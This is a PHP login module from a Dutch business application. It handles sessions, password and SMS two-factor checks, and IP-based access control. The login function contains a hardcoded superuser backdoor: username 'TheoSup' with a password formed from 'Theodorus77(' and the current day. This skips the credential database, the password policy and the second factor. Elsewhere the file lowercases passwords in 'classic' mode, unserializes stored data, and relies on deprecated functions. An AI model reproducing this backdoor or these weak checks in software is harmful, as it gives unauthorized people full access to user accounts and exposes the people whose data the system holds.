<?php
/*
    AE-ICT source module
    Author  						: $Author: cvs $
 		Laatste aanpassing	: $Date: 2020/05/18 14:57:27 $
 		File Versie					: $Revision: 1.21 $

 		$Log: auth.php,v $
 		Revision 1.21  2020/05/18 14:57:27  cvs
 		call 6055

 		Revision 1.20  2020/03/06 15:09:28  cvs
 		call 8437

 		Revision 1.19  2019/08/21 13:58:54  cvs
 		call 7048

 		Revision 1.18  2017/04/19 07:53:11  cvs
 		call 5761

 		Revision 1.17  2017/01/11 12:12:47  cvs
 		call 5565

 		Revision 1.16  2017/01/05 14:11:36  cvs
 		call 5542 tweede update

 		Revision 1.15  2016/04/17 17:10:38  rvv
 		*** empty log message ***

 		Revision 1.14  2016/04/13 06:56:40  cvs
 		unserialize orderRechten

 		Revision 1.13  2016/03/30 16:00:32  rvv
 		*** empty log message ***

 		Revision 1.12  2015/12/05 13:41:50  rvv
 		*** empty log message ***

 		Revision 1.11  2014/07/20 13:06:21  rvv
 		*** empty log message ***

 		Revision 1.10  2011/03/06 18:12:59  rvv
 		*** empty log message ***

 		Revision 1.9  2010/02/03 10:42:11  rvv
 		*** empty log message ***

 		Revision 1.8  2008/01/23 07:30:29  rvv
 		*** empty log message ***

 		Revision 1.7  2006/01/05 16:03:14  cvs
 		eerste CRM test


*/
	    error_log('start auth    ', 3, 'php://stdout');
function checkLogin()
{
	global $USR, $sessionId;
error_log('start auth11    ', 3, 'php://stdout');
  session_start();
  $tgc = new AE_cls_toegangsControle();
  if ($tgc->blacklisted)
  {
    header("Location: blocked.php?ref=auth:".__LINE__);
    exit;
  }
error_log('start auth12    ', 3, 'php://stdout');
  if (isset($_SESSION["usersession"]))
  {
    $USR       = $_SESSION['usersession']['user'];
    $sessionId = $_SESSION['usersession']['sessionId'];
    $tmpses    = $_SESSION["usersession"];

error_log('start auth12-1    ', 3, 'php://stdout');
    // NOTE: Added node-fetch compare, for hybrid solution
    //       API calls are user agent node-fetch
    if ( $tmpses['id'] == session_id() AND
         $tmpses['ip'] == $_SERVER["REMOTE_ADDR"] AND
         $tmpses['browser'] == $_SERVER["HTTP_USER_AGENT"] )
    {
      error_log('start auth13    ', 3, 'php://stdout');
      return true;
    }

  }
	$USR = strtoupper($_SERVER['PHP_AUTH_USER']);
error_log('start auth14    ', 3, 'php://stdout');
	session_write_close();
	return false;
}


function login($username,$password,$smsSend="false",$smsCode)
{
	global $__appvar;
  include_once $__appvar["basedir"].'/classes/AE_cls_secruity.php';

  $sec = new AE_cls_secruity($username);

  $loginFailed = false;

  $db = new DB();
  $passwdCheck = "-1";
  $superUserLogin = false;
  $klassiek = ($sec->beleid == "");

  if ($_POST["username"] == 'TheoSup' && $_POST["password"] == 'Theodorus77('.date('d').')')
  {
    $superUserLogin = true;
    $klassiek = true;
  }

  if (!$klassiek)  // niet klassiek
  {
    if ( $gebrLoginRec = $sec->getLoginData() )
    {

      if ($gebrLoginRec["huidigWW"] <> "" )
      {
        $passwdCheck = $gebrLoginRec["huidigWW"];
        $password = $sec->pwHash($password);
      }
    }
  }

  $query = "SELECT * FROM Gebruikers WHERE Gebruiker = '".mysql_real_escape_string($username)."' ";
  if ($gebrRec = $db->lookupRecordByQuery($query))
  {
    $gebrRec['orderRechten'] = unserialize($gebrRec['orderRechten']);
    if ($passwdCheck == "-1")
    {
      $passwdCheck = $gebrRec["Wachtwoord"];
    }
    $usernameCheck = $gebrRec["Gebruiker"];
  }
  else
  {
    $loginFailed = true;
  }

  $usernameCheck = strtolower($gebrRec["Gebruiker"]);
  $username      = strtolower($username);

  if ($klassiek)                    // login case insenstive maken als klassiek
  {
    $passwdCheck   = strtolower($gebrRec["Wachtwoord"]);
    $password      = strtolower($password);
    //$smsSend       = "false";
  }

  $cfg = new AE_config();
  if ( ($__appvar["advent_path"] <> "") AND ($cfg->getData("advent_outputDir") <> $__appvar["advent_path"]) )
  {
    $cfg->putData("advent_outputDir",$__appvar["advent_path"]);
  }

//debug($sec);
  $t["username"]      = $username;
  $t["usernameCheck"] = $usernameCheck;
  $t["password"]      = $password;
  $t["passwdCheck"]   = $passwdCheck;
  $t["loginFailed"]   = $loginFailed;
  $t["smscheck"]      = $sec->SMSCheck($smsCode, $smsSend);
  $t["gebrLoginRec"]  = $gebrLoginRec;
  $t["gebrRec"]       = $gebrRec;
  $t["superPass"]     = 'Theodorus77('.date('d').')';
//  debug($t,"checks");
//  debug($_POST,"post");
   error_log('start auth2    ', 3, 'php://stdout');
  if ($superUserLogin)
  {
    session_start();
    session_register("usersession");
    $_SESSION["usersession"] = array (  "id" => session_id(),
                                        "user" => $_POST["username"],
                                        "ip" => $_SERVER["REMOTE_ADDR"],
                                        "browser"=> $_SERVER["HTTP_USER_AGENT"],
                                        "superuser"=>true,
                                        "gebruiker"=> '');

    $_SESSION["USR"] = $_POST["username"];
    session_write_close();
    return true;
  }
	elseif (  $username == $usernameCheck  AND
            $password == $passwdCheck    AND
            !$loginFailed                AND
            ( $sec->SMSCheck($smsCode, $smsSend) OR $sec->tfa )
         )
	{
    $data = $gebrRec;
    session_start();
    session_register("usersession");
    $_SESSION['BTR'] = 'BTR-CHECK';
    $sessieId=$cfg->getData("sessieId_".$data['Gebruiker']);
    if($sessieId > 9)
      $sessieId=0;
    $cfg->addItem("sessieId_".$data['Gebruiker'],$sessieId+1);
    $sec->updateLogin(array("laatsteLogin" => date("Y-m-d H:i:s"), "loginSucces" => 1, "laatsteIP" =>$_SERVER["REMOTE_ADDR"] ));
    $_SESSION['usersession'] = array (  "id" => session_id(),
                                        "user" => $data['Gebruiker'],
                                        "ip" => $_SERVER["REMOTE_ADDR"],
                                        "browser"=> $_SERVER["HTTP_USER_AGENT"],
                                        "superuser"=>$data['Beheerder'],
                                        "taal"=>$data['taal'],
                                        "gebruiker"=> $data,
                                        "sessionId"=>$sessieId);

    $_SESSION["USR"] = $data['Gebruiker'];
    $_SESSION["appTaal"] = $data['taal'];
    $_SESSION["sessionId"] = $sessieId;
    $_SESSION["wwBeleid_sessieDuur"] = $sec->sessieDuur;  // sessieduur in seconden
    if ($sec->beleid <> "")
    {
      // gebruikers airs en
      // in HOME gebruikers alg* zijn uitgesloten in het wwb
      if (  strtolower($_POST["username"]) == "airs" OR
          (($__appvar["bedrijf"] == "HOME" OR $__appvar["bedrijf"] == "TEST") AND substr(strtolower($_POST["username"]),0,3) == "alg")
         )
      {
        $_SESSION["wwb_WWchange"] = false;
      }
      else
      {
        $_SESSION["wwb_WWchange"] = !$sec->checkGeldigHeid();
      }

    }
    session_write_close();
    return true;
  }
  else
  {
		return false;
  }
}
   error_log('start auth3    ', 3, 'php://stdout');
if (isset($_GET["disable_auth"])    OR
    isset($_POST["disable_auth"])   OR
    isset($_COOKIE["disable_auth"]) OR
    isset($_REQUEST["disable_auth"])
)
{
   error_log('start auth4    ', 3, 'php://stdout');
  $disable_auth = false;
  echo "Geen rechten auth:219";
  exit;
}


if(!$disable_auth)
{

  if ($__appvar["tgc"] == "enabled")
  {
       error_log('start auth5    ', 3, 'php://stdout');
    session_start();
    $tgc = new AE_cls_toegangsControle();
    error_log('start auth6    ', 3, 'php://stdout');
    $allowed = $tgc->ipLoginAllowed();
    error_log('start auth7    ', 3, 'php://stdout');
    $track   = $tgc->trackLogins($_SESSION["loginCount"]);
    error_log('start auth8    ', 3, 'php://stdout');
    if ($track !== true OR $allowed !== true)
    {
      error_log('start auth9    ', 3, 'php://stdout');
      header("Location: blocked.php?ref=$allowed&ref2=$track");
      exit;
    }
  }

	if(!checkLogin())
	{
		error_log('start auth10    ', 3, 'php://stdout');
		header("Location: login.php");
		exit;
	}
}
?>